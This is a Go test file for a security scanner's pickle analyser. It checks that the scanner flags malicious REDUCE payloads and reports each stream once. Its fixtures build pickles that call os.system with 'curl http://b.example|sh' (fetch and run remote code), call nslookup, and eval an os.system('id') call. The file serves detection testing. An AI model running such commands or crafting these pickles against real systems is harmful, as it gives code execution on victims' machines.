package pickle

import (
	"strings"
	"testing"

	"github.com/fr0g-66723067-io/sc4n/internal/limits"
	"github.com/fr0g-66723067-io/sc4n/internal/report"
)

// payloadStream builds PROTO 2, then for each (module,name,arg) triple
// GLOBAL/MEMOIZE/BINUNICODE/MEMOIZE/TUPLE1/MEMOIZE/REDUCE/MEMOIZE, then STOP.
func payloadStream(calls ...[3]string) []byte {
	out := []byte{opPROTO, 2}
	slot := byte(0)
	for _, c := range calls {
		out = append(out, 'c')
		out = append(out, c[0]...)
		out = append(out, '\n')
		out = append(out, c[1]...)
		out = append(out, '\n')
		out = append(out, opMEMOIZE, slot)
		slot++
		out = append(out, binUnicode(c[2])...)
		out = append(out, opMEMOIZE, slot)
		slot++
		out = append(out, opTUPLE1, opMEMOIZE, slot)
		slot++
		out = append(out, opREDUCE, opMEMOIZE, slot)
		slot++
	}
	return append(out, opSTOP)
}

func countRule(fs []report.Finding, id string) int {
	n := 0
	for _, f := range fs {
		if f.RuleID == id {
			n++
		}
	}
	return n
}

// TestMaliceOncePerStream pins the count contract: the finding states "this
// artifact runs a payload", so a stream with several payload-bearing REDUCEs
// gets one finding, not one per call. A YOLO checkpoint's data.pkl has thousands.
func TestMaliceOncePerStream(t *testing.T) {
	_, fs := walk(t, payloadStream(
		[3]string{"posix", "system", "nslookup a.example"},
		[3]string{"os", "system", "curl http://b.example|sh"},
		[3]string{"builtins", "eval", "__import__('os').system('id')"},
	))
	if got := countRule(fs, "SC4N-MALICE-CONSTRUCTED"); got != 1 {
		t.Fatalf("MALICE-CONSTRUCTED x%d, want exactly 1", got)
	}
	for _, f := range fs {
		if f.RuleID != "SC4N-MALICE-CONSTRUCTED" {
			continue
		}
		if f.Extra["family"] != "pickle-reduce" || f.Extra["callable"] != "posix.system" {
			t.Fatalf("extra = %v, want the first payload call to name posix.system", f.Extra)
		}
		if !strings.Contains(f.Evidence, "command string") {
			t.Fatalf("evidence does not classify the payload: %q", f.Evidence)
		}
	}
}

// TestMalicePayloadPredicate is the discrimination table: the same mechanism must
// separate a payload argument from a structural one, or every published
// ultralytics checkpoint is reported as confirmed-malicious.
func TestMalicePayloadPredicate(t *testing.T) {
	cases := []struct {
		name string
		call [3]string
		want string // substring of the claim, "" for none
	}{
		{"process sink with a command", [3]string{"posix", "system", "nslookup a.example"}, "command string"},
		{"code sink with source", [3]string{"builtins", "eval", "__import__('os').system('id')"}, "compiles and runs"},
		{"dunder attribute", [3]string{"builtins", "getattr", "__globals__"}, `dunder attribute name "__globals__"`},
		{"plain attribute on a class", [3]string{"builtins", "getattr", "forward"}, ""},
		{"allowlisted callable", [3]string{"collections", "OrderedDict", "some bytecode-ish text"}, ""},
		{"deserialiser", [3]string{"marshal", "loads", "co_code"}, "deserialises in place"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, fs := walk(t, payloadStream(c.call))
			got := ""
			for _, f := range fs {
				if f.RuleID == "SC4N-MALICE-CONSTRUCTED" {
					got = f.Evidence
				}
			}
			if c.want == "" {
				if got != "" {
					t.Fatalf("emitted a constructed grade: %q", got)
				}
				return
			}
			if !strings.Contains(got, c.want) {
				t.Fatalf("evidence %q does not contain %q", got, c.want)
			}
		})
	}
}

// TestMaliceSilentProbe pins that the format sniffer's dry walk does not emit:
// the probe runs on every file the dispatcher opens, so a leak here would put a
// critical finding on artifacts that were never parsed as pickles. The walker is
// built the way probePickle builds it, with a real sink attached so that a
// missing silent check shows up as a finding rather than as nothing.
func TestMaliceSilentProbe(t *testing.T) {
	data := payloadStream([3]string{"posix", "system", "nslookup a.example"})
	c := report.NewCollector(0)
	w := &walker{
		sink: c.For("probe.pkl"), lim: limits.Default(), data: data,
		mm: newMemo(len(data)), globals: map[string]*Global{},
		structs: map[string]*structStat{}, once: map[string]bool{}, silent: true,
		memoOverwriteOff: -1,
	}
	w.segment(0)
	if n := countRule(c.Findings(), "SC4N-MALICE-CONSTRUCTED"); n != 0 {
		t.Fatalf("silent probe emitted %d constructed findings", n)
	}
}
